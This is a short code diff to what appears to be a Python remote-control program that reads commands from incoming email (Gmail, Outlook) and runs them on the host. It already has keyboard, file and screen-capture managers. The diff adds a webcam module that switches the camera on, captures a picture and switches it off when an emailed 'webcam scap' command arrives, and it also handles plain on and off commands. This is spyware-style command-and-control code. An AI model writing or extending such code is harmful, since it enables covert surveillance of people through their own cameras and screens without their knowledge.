@@ -6,6 +6,7 @@ import ManagerKeyboard
 import ManagerSystem
 import ManagerSoft
 import ManagerFile
+import ManagerWebcam
 import FactoryOutLook
 import FactoryGmail
 import FactoryGmailApi
@@ -54,6 +55,17 @@ def listen(msg,email):
             if "scap" == string[2]:
                 screen.scap()
 
+        if "webcam" == string[1]:
+            cam = ManagerWebcam.ManagerWebcam(email)
+            if "scap" == string[2]:
+                cam.turnOn()
+                cam.capPicture()
+                cam.turnOff()
+            if "on" == string[2]:
+                cam.turnOn()
+            if "off" == string[2]:
+                cam.turnOff()
+
     return msg + "\nREP:\n" + rep
 
 
@@ -64,7 +76,6 @@ while True:
     print(len(mails))
     for mailNow in mails:
         if(mailNow.isValidate()):
-
             rep = listen(mailNow.getBody(),mailNow)
             print(rep)
         else:
